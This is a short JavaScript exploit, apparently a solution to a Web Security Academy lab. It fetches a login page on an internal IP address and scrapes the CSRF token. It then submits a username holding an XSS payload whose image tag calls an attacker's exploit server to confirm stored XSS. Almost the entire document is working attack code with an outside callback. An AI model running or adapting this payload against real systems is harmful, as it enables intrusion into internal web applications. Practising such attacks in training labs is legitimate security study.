<script>
function xss(url, text, vector) { // Pass in text (login form page) to obtain the CSFR token of login form
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
  }
  ))
}

fetchUrl("http://192.168.0.14:8080", "http://acd91fb81e485fe5801e8912018a00f4.web-security-academy.net/exploit");
// The webpage at the found IP is a login form
// Try change web document location by submiting the login form with username field value equal to an XSS payload
// The XSS payload is an visit to attacker's exploit server
// If the visit is successful, that means the XSS payload is being run -> Stored XSS where username is displayed again on login form when password is wrong
</script>
